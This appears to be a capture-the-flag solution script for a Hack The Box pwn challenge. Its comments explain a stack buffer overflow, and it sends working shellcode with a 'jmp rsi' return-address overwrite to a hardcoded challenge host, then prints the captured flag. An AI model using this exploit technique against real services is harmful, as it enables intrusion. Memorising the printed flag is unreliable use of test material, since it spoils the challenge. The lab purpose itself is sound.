#!/usr/bin/env bash

set -euo pipefail

# Challenge: Regularity
# Category: Pwn
# Platform: Hack The Box CTF Try Out
#
# Files provided:
#   - regularity
#   - flag.txt (local fake flag for testing)
#
# What the binary does:
#   1. prints:
#        "Hello, Survivor. Anything new these days?"
#   2. reads user input
#   3. prints:
#        "Yup, same old same old here as well..."
#   4. exits
#
# Vulnerability:
# The custom read() helper reserves 0x100 bytes on the stack:
#
#   sub rsp, 0x100
#
# but reads 0x110 bytes:
#
#   mov edx, 0x110
#   syscall      ; read(0, rsp, 0x110)
#
# So we overflow 16 bytes beyond the stack buffer and overwrite the saved
# return address.
#
# Why this challenge is neat:
# Normally, a stack overflow with shellcode also needs a stack address leak.
# But here we get an accidental helper:
#
#   - read() uses `rsi = rsp` as the input buffer
#   - after read() returns, `rsi` still points to our shellcode on the stack
#   - `_start` contains:
#         0x401041: jmp rsi
#
# That means we do not need to know the stack address at all.
# We simply overwrite RIP with 0x401041 and the program jumps directly to the
# buffer we control.
#
# Real-world lesson:
# Tiny hand-written binaries and firmware stubs often skip compiler-added
# protections. When registers still point to attacker-controlled buffers, a
# single gadget like `jmp rsi` or `jmp rsp` can completely remove the need for
# an info leak.
#
# Exploit plan:
#   1. Put shellcode at the beginning of the input buffer
#   2. Pad to 256 bytes
#   3. Overwrite the saved RIP with 0x401041 (`jmp rsi`)
#   4. Shellcode opens `flag.txt`, reads it, writes it to stdout, then exits
#
# Offsets:
#   - buffer size: 0x100
#   - overwrite offset to RIP: 256 bytes
#
# Flag obtained on the live instance:
# HTB{jMp_rSi_jUmP_aLl_tH3_w4y!}

HOST="${1:-154.57.164.67}"
PORT="${2:-30622}"

python3 - "$HOST" "$PORT" <<'PY'
import re
import socket
import struct
import sys

host = sys.argv[1]
port = int(sys.argv[2])

# 64-bit Linux shellcode:
#   open("flag.txt", O_RDONLY)
#   read(fd, rsp, 0x60)
#   write(1, rsp, 0x60)
#   exit(0)
#
# We keep it position-independent so it can live directly on the stack.
shellcode = (
    b"\x48\x31\xc0\x50"
    b"\x48\xbb\x66\x6c\x61\x67\x2e\x74\x78\x74"
    b"\x53\x48\x89\xe7"
    b"\x48\x31\xf6\x48\x31\xd2"
    b"\xb0\x02\x0f\x05"
    b"\x48\x89\xc7"
    b"\x48\x89\xe6"
    b"\xba\x60\x00\x00\x00"
    b"\x48\x31\xc0\x0f\x05"
    b"\xbf\x01\x00\x00\x00"
    b"\xb0\x01\x0f\x05"
    b"\xb0\x3c\x48\x31\xff\x0f\x05"
)

jmp_rsi = 0x401041
payload = shellcode.ljust(0x100, b"\x90") + struct.pack("<Q", jmp_rsi) + b"TRAILING"

s = socket.socket()
s.settimeout(3)
s.connect((host, port))

# Receive the greeting first so we stay in sync with the service.
try:
    _ = s.recv(1024)
except Exception:
    pass

s.sendall(payload)

response = b""
try:
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        response += chunk
except Exception:
    pass
finally:
    s.close()

text = response.decode("latin1", "ignore")
match = re.search(r"HTB\{[^}]+\}", text)
if not match:
    print(text)
    raise SystemExit(1)

print(match.group(0))
PY
